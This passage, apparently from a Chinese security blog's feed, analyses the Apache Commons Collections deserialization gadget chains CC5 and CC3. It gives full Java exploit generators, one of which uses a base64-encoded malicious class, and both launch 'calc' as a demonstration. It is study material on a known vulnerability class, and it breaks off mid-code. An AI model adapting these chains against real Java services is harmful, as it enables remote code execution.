<h1 id="TemplatesImpl类"><a href="#TemplatesImpl类" class="headerlink" title="TemplatesImpl类"></a>TemplatesImpl类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl类的newTransformer方法</span><br><span class="line"></span><br><span class="line"> transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);</span><br><span class="line">            </span><br></pre></td></tr></table></figure>



<p>TemplatesImpl类的getTransletInstance()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">       <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">           <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">           <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure>



<p>defineClass</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">      <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">return</span> defineClass(name, b, off, len, <span class="literal">null</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>







<p>应用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdk8u71++</span><br><span class="line"></span><br><span class="line">apache commons collections-<span class="number">4.0</span></span><br></pre></td></tr></table></figure>









]]></content>
  </entry>
  <entry>
    <title>CC5</title>
    <url>/2023/03/27/CC5/</url>
    <content><![CDATA[<p>在分析CC5前看下CC1的lazymap链子</p>
<img src="/2023/03/27/CC5/1623075894_60be2c3691871913b637d.png!small" class="" title="1623075894_60be2c3691871913b637d.png!small?1623075895996">





<p>CC5在第五步后与CC1完全一样</p>
<h1 id="lazymap"><a href="#lazymap" class="headerlink" title="lazymap"></a>lazymap</h1><p>构造方法有两个对我们有用的是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>get方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">       <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">       <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">           <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);<span class="comment">//调用了transform ，factory传入我们构造的Transformer[]</span></span><br><span class="line">           map.put(key, value);</span><br><span class="line">           <span class="keyword">return</span> value;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> map.get(key);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>







<h1 id="分析TiedMapEntry"><a href="#分析TiedMapEntry" class="headerlink" title="分析TiedMapEntry"></a>分析TiedMapEntry</h1><p>先看下TiedMapEntry中如何调用的get()</p>
<p>本类中有个toString()方法调用了getValue()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>而getValue()中调用了get()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>再通过构造器将map赋为LazyMap即可回到CC1的后半部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h1><p>接下来看谁调用了<code>toString()</code>,在<code>BadAttributeValueExpException</code>类中的<code>readObject()</code>中发现调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">       ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">       <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">           val = <span class="literal">null</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">           val= valObj;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">           val = valObj.toString();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">           val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<p>调用的是<code> valObj.toString();</code>，所以现在要做的就是如何将<code>valobj</code>构造成<code>TiedMapEntry</code>,看下<code>valobj</code>从哪来的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">       <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>



<p> public ObjectInputStream.GetField readFields();方法的返回类型为ObjectInputStream.GetField ，<strong>它返回GetField对象，该对象表示未序列化的对象的永久字段。</strong></p>
<p>先调用<code>readFields</code>从流中读取了所有的持久化字段，然后调用<code>get()</code>方法得到了名字是<code>val</code>的字段。</p>
<p>所以可以通过修改<code>val</code>的值，来修改<code>valobj</code>，而<code>val</code>是本类中的一个私有属性，直接反射修改即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Object val;<span class="comment">//private</span></span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;val&quot;</span>);<span class="comment">//反射修改</span></span><br><span class="line">field.set(obj,TiedMapEntry);</span><br></pre></td></tr></table></figure>

<img src="/2023/03/27/CC5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NzMzNzUx,size_16,color_FFFFFF,t_70.png" class="" title="img">





<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;admire@&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Reflection</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure>







<p>参考[(143条消息) <a href="https://blog.csdn.net/weixin_54902210/article/details/125078125">Java反序列化]—CommonsCollections5_Sentiment.的博客-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>CC3和CC4</title>
    <url>/2023/04/06/CC3%E5%92%8CCC4/</url>
    <content><![CDATA[<p>CC3链是基于前面的CC2链和CC1链改造而来的</p>
<h2 id="复习一下"><a href="#复习一下" class="headerlink" title="复习一下"></a>复习一下</h2><ol>
<li><p><code>ConstantTransformer</code></p>
<p>ConstantTransformer，调用该类的transform方法返回传入对象本身。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;   </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>InvokerTransformer</code></p>
<p>InvokerTransformer，其transform方法能通过invoke执行输入的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;    </span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();    </span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);  </span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>ChainedTransformer</code></p>
<p>它的transform方法能调用链中所有的transform方法，并且将前一个transform的输出作为当前transform的输入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;   </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;  </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">     object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>在开始之前先写</p>
<h2 id="TrAXFilter类的构造方法"><a href="#TrAXFilter类的构造方法" class="headerlink" title="TrAXFilter类的构造方法"></a>TrAXFilter类的构造方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    <span class="comment">//调用核心利用代码</span></span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到newTransformer 想到赋值templates为被增加了恶意类的TemplatesImpl</p>
<p>于是构造利用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"></span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                       <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                       <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p>这里使用一个InstantiateTransformer来对templates进行赋值</p>
<h2 id="InstantiateTransformer的构造方法"><a href="#InstantiateTransformer的构造方法" class="headerlink" title="InstantiateTransformer的构造方法"></a>InstantiateTransformer的构造方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="InstantiateTransformer类的tranform方法"><a href="#InstantiateTransformer类的tranform方法" class="headerlink" title="InstantiateTransformer类的tranform方法"></a>InstantiateTransformer类的tranform方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">//不是class对象则抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                    + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获取构造器</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        <span class="comment">//实例化对象</span></span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"> </span><br><span class="line">  </span><br></pre></td></tr></table></figure>









<p>接下来就是利用出口类进行触发</p>
<h1 id="基于TransformedMap的CC3链"><a href="#基于TransformedMap的CC3链" class="headerlink" title="基于TransformedMap的CC3链"></a>基于TransformedMap的CC3链</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Setvalue</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造核心利用代码</span></span><br><span class="line">       </span><br><span class="line">        <span class="type">byte</span> [] bytes =Base64.decode(<span class="string">&quot;yv66vgAAADQAHAEABEV2aWwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACAEADVN0YWNrTWFwVGFibGUBABFqYXZhL2xhbmcvUnVudGltZQcACwEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA0ADgoADAAPAQAEY2FsYwgAEQEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABMAFAoADAAVAQAGPGluaXQ+DAAXAAYKAAQAGAEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEAIQACAAQAAAAAAAIACAAFAAYAAQAHAAAAMgACAAEAAAARuAAQEhK2ABZXpwAHS6cAA7EAAQAAAAkADAAJAAEACgAAAAcAAkwHAAkDAAEAFwAGAAEABwAAABEAAQABAAAABSq3ABmxAAAAAAABABoAAAACABs=&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> templatesImpl.getClass();</span><br><span class="line">        Field _name=clz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> clz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//触发利用链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span>  <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(java.lang.annotation.Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//  序列化与反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(instance);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">			AnnotationInvocationHandler.readObject()</span><br><span class="line">				AbstractInputCheckedMapDecorator.setValue()</span><br><span class="line">					 TransformedMap.checkSetValue()</span><br><span class="line">							ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								 InstantiateTransformer.tranform()</span><br><span class="line">								 </span><br><span class="line">TestTemplatesImpl-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()+newInstance()</span><br></pre></td></tr></table></figure>



<h1 id="基于lazyMap的CC3链"><a href="#基于lazyMap的CC3链" class="headerlink" title="基于lazyMap的CC3链"></a>基于lazyMap的CC3链</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span 